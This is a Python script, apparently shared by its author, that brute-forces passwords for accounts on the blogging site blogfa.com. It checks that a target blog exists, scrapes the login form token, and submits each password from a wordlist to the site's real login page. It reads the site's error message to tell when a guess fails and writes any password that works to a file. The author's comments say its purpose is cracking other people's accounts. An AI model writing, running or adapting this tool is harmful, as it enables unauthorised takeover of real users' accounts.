#!/usr/bin/python
# -------------------------------------------------
__AUTHOR__ = 'MOJTABA OR C.S.R OR Mr EXPLOiT'
__TELEGRAM_ID__ = '@creator_typeri'
__INSTAGRAM_ID__ = '@MJi_Devil'
__GITHUB__ = 'https://github.com/C4ssif3r'
__COMMENT__ = '''
hello welcome to the blogfa cracker :)
good luck and i hope because you cracking many blogfa acciunts 
'''
# -------------------------------------------------
# import mudules                                   |
# -------------------------------------------------
import os

try:
    from colorama import Fore, init # for colors

except:
    os.system('pip install colorama')
# -------------------------------------------------
try:
    import time
except:
    os.system('pip install time') # for sleep
# -------------------------------------------------
try:
    import requests as rq # for send req's
except:
    os.system('pip install requests')
# -------------------------------------------------
try:
    from bs4 import BeautifulSoup 
except:
    os.system('pip install bs4')
# -------------------------------------------------
import sys

os.system('clear')

init() # from colorama lib
# -------------------------------------------------
'''


      -~·-.'´::`;-:~.~·–.,   °                               _   ‘                                       _             _                 °              _             ',:'/¯/`:,   
  /:::::/::::/::::::::::::::'`,           .·:¯:`/';            /::/'; ‘                                 ,·´/:::::'`:,   ,:´/::::'`:,'                     .´/: : :/:`;        /:/_/::::/';' 
 /-~·-'·´¯`·-~·––  ::;:::::'i'        /:::::/:::\          /::/: ';                                '/  /:::::::::'`·/::/::::::::/'\                   /:/:_: /:::'i       /:'     '`:/::;‘
 '`·,                       '`;::';      /·´¯'`·;::::\      ,·´¯'`;::/                                /,·'´ ¯¯'`·;:::/:;·´ ¯ '`·;/:::i                /·´     '`;:::;'      ;         ';:';‘
    '`i       'i*^~;          'i / °   ;         \:::/`:, .'      ';/'                               /            '`;':/            \:::';               i         'i::;       |         'i::i 
     ';       ; / ,·          .'/',     ';          \/::::,'    '   /                               ,'               `'               ';:::i°             ';        'i::;°      ';        ;'::i 
     ';      ;' ;´         ~´;:::'i°    \          `'·:,:'´      /'                               ,'                                  ;::i‘'    ,. -.,   ';        ';::;       'i        'i::i' 
   /´:;     ;–·:`:,          '`;:/°     '`,                  ,'´'                                ;'       ,^,         ,:^,          'i::;°   /:::::/`:.,;       ';::;'        ;       'i::;' 
,/::;:'\,  '/::::::;'           'i/' °        `,             ,'´:'*:^;                            'i        ;:::\       ;/   ',         'i:;'   /;:-:;/:::::'|       ;:/`;‘       ';       i:/'  
'.     '` '´·–·~*´           ,'  '           `;         ,/::::::::/'                            'i       'i::/  \     /      ;        ;/   ,´      `·:;:·'       ;/'::/         ';     ;/ °  
  ` ·-.,                 ,-·´   '           ,·'         '¯ '`*^;:/‘                              ;      'i:/     `*'´       'i       ;/ °  ';                     `;/'           ';   / °    
         '`*^~·- ·^*'´     '              ';                 ,'/'                                '`.    ,'                   '.     /        '`·,           _,.-·'´ °            `'´       °
                   '                        '`*^~·–-·~^*'´‘                                      `*´                      `'*'´               '`'*^*'´¯    ”                  ‘         


'''
# -------------------------------------------------
print (Fore.RED+'''
 __        _   _   ___ _            _  __   _   _       ___ __  
 )_)  )   / ) / _  )_ /_)    __    / ` )_) /_) / ` )_/  )_  )_) 
/__) (__ (_/ (__/ (  / /          (_. / \ / / (_. /  ) (__ / \  
                         BY      MJi                                          
comment 3> # *.blogfa.com accounts we are going to crack :)
''') # banner


print(Fore.BLUE+'''
telegram > @creator_typeri | instagram[IG] > @MJi_devil 
                    RUBIKA    >    @ShubadehBaz 
''')

time.sleep(1.0)

try:
    pss = sys.argv[1]
except:
    print (Fore.WHITE+'['+Fore.CYAN+' # '+Fore.WHITE+'] set target and pass list e:x >\n')
    time.sleep(0.8)
    print ('launch >>> python mj-blogfa-cracker.py pass.txt target iD\n')
    time.sleep(0.6)
    print ('pass.txt == your pass list or patch example: home/root/Desktop/mji.txt\n')
    time.sleep(0.5)
    print ('target in argv2 your target id ')
    sys.exit()
try:
    tar = sys.argv[2]
except:
    print (Fore.WHITE+'['+Fore.CYAN+' # '+Fore.WHITE+'] set target and pass list e:x >\n')
    time.sleep(0.8)
    print ('launch >>> python mj-blogfa-cracker.py pass.txt target\n')
    time.sleep(0.6)
    print ('pass.txt == your pass list or patch ex: home/root/Desktop/mji.txt\n')
    time.sleep(0.5)
    print ('target in argv2 your target id ')
    sys.exit()
# -------------------------------------------------
print('')
print (Fore.WHITE+'['+Fore.GREEN+'*'+Fore.WHITE+'] checking this user > '+Fore.YELLOW+tar)
print('')
time.sleep(2.4)
# -------------------------------------------------
# chack automatic username                         |
# -------------------------------------------------
__CHEK__ = ('http://'+tar+'.blogfa.com')
_CHEK_ = rq.get(__CHEK__)
if _CHEK_.status_code == 404:
    print (Fore.WHITE+'['+Fore.RED+' ! '+Fore.WHITE+'] User ['+Fore.RED+tar+Fore.WHITE+']'+Fore.WHITE+' not FOUND on ['+Fore.GREEN+'blogfa.com'+Fore.WHITE+']'+Fore.WHITE+' Check user and run again !!! ')
    time.sleep(3)
    sys.exit()
else:
    print (Fore.WHITE+'['+Fore.GREEN+' * '+Fore.WHITE+'] User ['+Fore.GREEN+tar+']'+Fore.WHITE+' FOUND on '+Fore.WHITE+'['+Fore.GREEN+'blogfa.com'+Fore.WHITE+'] SKIPPIMG ... !!! ')
    print('')
# -------------------------------------------------

print (Fore.RED+'[*]'+Fore.WHITE+'TARGET => '+Fore.CYAN+tar)
print('')
time.sleep(4)
print (Fore.GREEN+'[*]'+Fore.WHITE+'STARTING CRACK PASSWORD FOR ['+Fore.RED+''+tar+Fore.WHITE+'] ...')
print('')
time.sleep(3.0)
# -------------------------------------------------
# _HED's__                                        |
# -------------------------------------------------
__HEDBLOG__ = {'Host': 'blogfa.com',
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate, br',
'Content-Type': 'application/x-www-form-urlencoded',
'Content-Length': '175',
'Origin': 'https://blogfa.com',
'Connection': 'keep-alive',
'Referer': 'https://blogfa.com/desktop/login.aspx?r=637860193478105692',
'Upgrade-Insecure-Requests': '1',
'Pragma': 'no-cache',
'Cache-Control': 'no-cache'
}
# __HED's__ end
# -------------------------------------------------
# load pass list
pas = open(pss, 'r').read().split()
___URL___ = rq.get('https://blogfa.com/desktop/login.aspx')

__INFO__ = (___URL___).text
__INFORMATION__ = BeautifulSoup(__INFO__, 'html.parser')

t_t = __INFORMATION__.find('input')['value']

# -------------------------------------------------

for __PASS__ in pas:
    
    __PAYLOAD__ = {"_tt":t_t,
"usrid":tar,
"ups":__PASS__,
"btnSubmit":"ورود+به+بخش+مدیریت+وبلاگ"}

    _REQS_ = rq.post('https://blogfa.com/desktop/login.aspx', data=__PAYLOAD__, headers=__HEDBLOG__)
    _rqPOST_ = (_REQS_).text

    blog = BeautifulSoup(_rqPOST_, 'html.parser')
    _dta_ = blog.find_all('i')
    _data_ = str(_dta_)

    ___CHECK_AUTHENTICATION___ = ("کلمه عبور را اشتباه وارد کرده اید")
    # -------------------------------------------------
    if ___CHECK_AUTHENTICATION___ in _data_:
        
        print(Fore.WHITE+'['+Fore.RED+'*'+Fore.WHITE+'] pass NOT found '+Fore.RED+''+__PASS__+'\n')


    if ___CHECK_AUTHENTICATION___ not in _data_:
        print('')
        print(Fore.WHITE+'['+Fore.GREEN+'*'+Fore.WHITE+'] pass found '+Fore.CYAN+'>_< '+Fore.GREEN+''+__PASS__)
        tr = tar+'.txt'
        time.sleep(1.5)
        print('')
        print (Fore.GREEN+'[#]'+Fore.YELLOW+' I can found pass >_– and saved to ['+tr+']  GOOD LUCK BYTCH !')
        time.sleep(1)
        # -------------------------------------------------
        with open(tr, 'w') as _tar_:
            _tar_.write('user > '+tar+' password > '+__PASS__)
        
        time.sleep(3)
        sys.exit()


        

    
